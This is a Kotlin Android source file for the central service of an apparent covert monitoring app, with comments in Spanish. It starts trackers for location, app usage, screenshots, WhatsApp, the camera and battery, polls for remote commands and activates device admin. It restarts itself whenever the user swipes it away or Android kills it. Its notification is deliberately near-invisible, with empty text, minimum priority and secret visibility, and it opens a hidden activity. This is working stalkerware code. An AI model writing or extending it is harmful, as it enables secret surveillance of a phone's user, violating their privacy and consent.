package com.empresa.monitor.service

import android.app.PendingIntent
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.app.AlarmManager
import androidx.core.app.NotificationCompat
import com.empresa.monitor.MonitorApp
import com.empresa.monitor.data.local.PreferencesManager
import com.empresa.monitor.service.monitoring.*
import com.empresa.monitor.R
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class MonitorForegroundService : Service() {

    @Inject lateinit var prefs: PreferencesManager
    @Inject lateinit var locationMonitor: LocationMonitor
    @Inject lateinit var usageMonitor: UsageMonitor
    @Inject lateinit var screenshotMonitor: ScreenshotMonitor
    @Inject lateinit var whatsappMonitor: WhatsAppMonitor
    @Inject lateinit var cameraMonitor: CameraMonitor
    @Inject lateinit var batteryMonitor: BatteryMonitor
    @Inject lateinit var commandPoller: CommandPoller
    @Inject lateinit var deviceAdminManager: com.empresa.monitor.service.admin.DeviceAdminManager

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(MonitorApp.NOTIFICATION_ID, buildNotification())
        acquireWakeLock()
        registerAlarmRestart()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                prefs.isMonitoring = true
                deviceAdminManager.ensureActiveAdmin(this)
                startAllMonitors()
            }
            ACTION_STOP -> {
                prefs.isMonitoring = false
                stopAllMonitors()
                releaseWakeLock()
                cancelAlarmRestart()
                stopSelf()
            }
        }
        return START_STICKY  // <-- Se reinicia automáticamente si Android lo mata
    }

    private fun startAllMonitors() {
        locationMonitor.start(this)
        usageMonitor.start(this)
        screenshotMonitor.start(this)
        whatsappMonitor.start(this)
        cameraMonitor.start(this)
        batteryMonitor.start()
        commandPoller.start()
    }

    private fun stopAllMonitors() {
        locationMonitor.stop()
        usageMonitor.stop()
        screenshotMonitor.stop()
        whatsappMonitor.stop()
        cameraMonitor.stop()
        batteryMonitor.stop()
        commandPoller.stop()
    }

    /**
     * Se llama cuando el usuario "desliza" para cerrar la app del recents
     * Inmediatamente reiniciamos el servicio
     */
    override fun onTaskRemoved(rootIntent: Intent?) {
        restartService()
        super.onTaskRemoved(rootIntent)
    }

    /**
     * Se llama cuando Android mata el servicio por presión de memoria
     */
    override fun onDestroy() {
        if (prefs.isMonitoring) {
            // Si aún debería estar activo, reiniciar
            restartService()
        }
        releaseWakeLock()
        super.onDestroy()
    }

    private fun restartService() {
        val intent = Intent(this, MonitorForegroundService::class.java)
        intent.action = ACTION_START
        startService(intent)

        // Backup: AlarmManager para despertar en 30s si falla
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val pi = PendingIntent.getService(
            this, 0,
            Intent(this, MonitorForegroundService::class.java).apply { action = ACTION_START },
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        alarm.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 30_000, pi)
    }

    private fun registerAlarmRestart() {
        // Alarm periódica cada 15 min como heartbeat de respaldo
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val pi = PendingIntent.getService(
            this, 1,
            Intent(this, MonitorForegroundService::class.java).apply { action = ACTION_CHECK },
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        alarm.setInexactRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 900_000,
            900_000, // cada 15 min
            pi
        )
    }

    private fun cancelAlarmRestart() {
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val pi = PendingIntent.getService(
            this, 1,
            Intent(this, MonitorForegroundService::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        alarm.cancel(pi)
    }

    private var wakeLock: PowerManager.WakeLock? = null

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "MonitorServicio:Wakelock"
        ).apply {
            acquire(600_000) // 10 min
        }
    }

    private fun releaseWakeLock() {
        wakeLock?.let {
            if (it.isHeld) it.release()
            wakeLock = null
        }
    }

    /**
     * Notificación casi invisible: no sonido, no vibración,
     * no aparece en lockscreen, no badge
     */
    private fun buildNotification() = NotificationCompat.Builder(this, MonitorApp.CHANNEL_MONITOR)
        .setContentTitle("")
        .setContentText("")
        .setSmallIcon(android.R.drawable.ic_menu_manage) // ícono pequeño genérico
        .setOngoing(true)
        .setSilent(true)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        .setContentIntent(
            PendingIntent.getActivity(
                this, 0,
                Intent(this, com.empresa.monitor.ui.HiddenActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
        )
        .build()

    companion object {
        const val ACTION_START = "com.empresa.monitor.START"
        const val ACTION_STOP = "com.empresa.monitor.STOP"
        const val ACTION_CHECK = "com.empresa.monitor.CHECK"
    }
}
